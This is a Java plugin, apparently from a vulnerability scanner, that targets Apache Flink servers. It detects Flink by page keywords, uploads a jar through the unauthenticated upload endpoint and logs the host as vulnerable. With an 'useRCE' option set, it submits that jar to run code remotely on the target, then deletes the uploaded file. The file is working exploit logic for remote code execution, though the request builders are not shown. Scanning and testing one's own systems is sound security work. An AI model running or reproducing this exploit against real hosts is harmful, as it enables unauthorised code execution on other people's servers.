package com.gbw.scanner.plugins.scripts.web.flink;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.GBWScanScript;
import com.gbw.scanner.plugins.scripts.GBWScanScriptCommonConfig;
import com.gbw.scanner.sink.SinkQueue;
import com.gbw.scanner.utils.HttpUtils;
import com.google.gson.Gson;
import com.xmap.api.utils.TextUtils;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;

public class GBWScanFlinkScript implements GBWScanScript {

    private static final Logger log = LoggerFactory.getLogger(GBWScanFlinkScript.class);

    private GBWScanFlinkScriptConfig config;

    public GBWScanFlinkScript(GBWScanFlinkScriptConfig config){

        this.config = config;
    }

    @Override
    public GBWScanScriptCommonConfig getConfig() {
        return config;
    }

    @Override
    public boolean isAccept(Host host) {
        return true;
    }

    private boolean isFlink(Host host, CloseableHttpClient httpClient) {

        HttpGet request = FlinkHttpRequestBuilder.makeFirstPageRequest(host,config);

        GBWHttpResponse response = HttpUtils.send(httpClient,request,true);

        String content = response.getContent();

        if(TextUtils.isEmpty(content))
            return false;

        return content.contains(config.getKeywords());
    }

    @Override
    public void scan(Host host, SinkQueue sinkQueue) {

        HttpUriRequest httpRequest;
        GBWHttpResponse httpResponse;
        String content;
        Gson gson = new Gson();

        CloseableHttpClient httpClient = null;


        UPloadStatus uPloadStatus;
        String upFileName = null;

        try {

            httpClient = GBWHttpClientBuilder.make(host.getProto(),host.getPort());

            if(isFlink(host,httpClient)){

                log.info("Find a apache flink ip:"+host.getIp());

                // try to upload jar
                httpRequest = FlinkHttpRequestBuilder.makeUPloadJarRequest(host,config);

                httpResponse = HttpUtils.send(httpClient,httpRequest,true);
                if(httpResponse.getStatus() == 200){

                    content = httpResponse.getContent();
                    uPloadStatus = gson.fromJson(content,UPloadStatus.class);

                    upFileName = uPloadStatus.getFile();

                    if(!TextUtils.isEmpty(upFileName)){

                        /*find a bug*/
                        log.warn(String.format("Find a apache flink upload bug,ip:%s,jar:%s",host.getIp(),upFileName));

                        GBWScanFlinkScriptResult result = new GBWScanFlinkScriptResult(config,host);
                        result.setPayload(uPloadStatus.getFilename());
                        sinkQueue.put(result);

                        /*exe rce*/
                        if(config.isUseRCE()){

                            httpRequest = FlinkHttpRequestBuilder.makesubmitJarRequest(host,config,upFileName);

                            httpResponse = HttpUtils.send(httpClient,httpRequest,true);

                            log.warn(String.format("Exe a apache flink rce ip:%s,jar:%s,res:%s",host.getIp(),upFileName,httpResponse.getContent()));
                        }

                        /*delete jar file*/
                        log.warn(String.format("Delete upload for IP:%s,jar:%s",host.getIp(),upFileName));

                        httpRequest = FlinkHttpRequestBuilder.makeDeleteJarRequest(host,config,upFileName);
                        HttpUtils.send(httpClient,httpRequest);
                    }
                }

            }

        }catch (Exception e){

            e.printStackTrace();
        }finally {

            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

    }


}
